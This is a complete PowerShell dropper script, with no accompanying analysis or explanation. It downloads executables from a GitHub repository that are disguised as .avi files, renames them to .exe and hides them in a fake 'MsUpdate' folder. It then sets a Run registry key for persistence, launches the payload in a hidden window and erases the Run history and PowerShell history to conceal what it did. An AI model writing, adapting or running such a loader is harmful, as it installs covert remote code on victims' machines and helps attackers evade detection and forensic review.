## Create directory
$ErrorActionPreference = 'SilentlyContinue'
$UserProfile = [System.Environment]::GetFolderPath("UserProfile")
$MsRdpNetPath = Join-Path $UserProfile "AppData\Local\Microsoft\MsUpdate"
if (-not (Test-Path -Path $MsRdpNetPath)) {
    $MsRdpNetFolder = New-Item -Path $MsRdpNetPath -ItemType Directory -Force 
    $MsRdpNetFolder.Attributes += "Hidden"
}

# Copy Agent
$rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\RegUpdate.exe"
$urlRemotoAgent = "https://github.com/emakedie/UCN/raw/refs/heads/main/RegUpdate.avi"
if (-not (Test-Path $rutaLocalAgent)) {
    Invoke-WebRequest -Uri $urlRemotoAgent -OutFile $rutaLocalAgent
}
if ((Get-Item $rutaLocalAgent).Name -ne "RegUpdate.exe") {
    $rutaNuevoNombreAgent = $rutaLocalAgent -replace 'RegUpdate.avi', 'RegUpdate.exe'
    Rename-Item -Path $rutaLocalAgent -NewName $rutaNuevoNombreAgent
}
$atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent

# Copy Ejecuter
# Definir rutas locales y URL
$rutaLocalZip = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.zip"
$urlRemotoZip = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN.zip"
$rutaDestinoExtraido = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN"
$rutaArchivoAvi = "$rutaDestinoExtraido\SMSUCN.avi"
$rutaArchivoExe = "$rutaDestinoExtraido\SMSUCN.exe"

# Descargar el archivo zip si no existe
if (-not (Test-Path $rutaLocalZip)) {
    Invoke-WebRequest -Uri $urlRemotoZip -OutFile $rutaLocalZip
}
# Extraer el contenido del zip si no se ha extraído aún
if (-not (Test-Path $rutaDestinoExtraido)) {
    # Crear la carpeta de destino si no existe
    New-Item -Path $rutaDestinoExtraido -ItemType Directory
    # Extraer el archivo zip
    Expand-Archive -Path $rutaLocalZip -DestinationPath $rutaDestinoExtraido -Force
}
# Comprobar si el archivo SMSUCN.avi existe y renombrarlo como .exe
if (Test-Path $rutaArchivoAvi) {
    Rename-Item -Path $rutaArchivoAvi -NewName $rutaArchivoExe
}
# Opcionalmente, establecer el archivo renombrado como oculto
$atributosOcultos = (Get-Item $rutaArchivoExe).Attributes -bor [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $rutaArchivoExe -Name Attributes -Value $atributosOcultos


# Registry path for the startup entries
$rutaRegistro = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$nombreEntrada = "MsUpdate"
if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
    $valorEntrada = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
    $null = New-ItemProperty -Path $rutaRegistro -Name $nombreEntrada -Value $valorEntrada -PropertyType String -Force
}

## Execution of the client
Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe" -WindowStyle Hidden


# Limpiar historial de ejecucion
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-Item -LiteralPath $registryPath -Force

# Limpiar historial Powershell
Clear-History
Remove-Item $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
exit
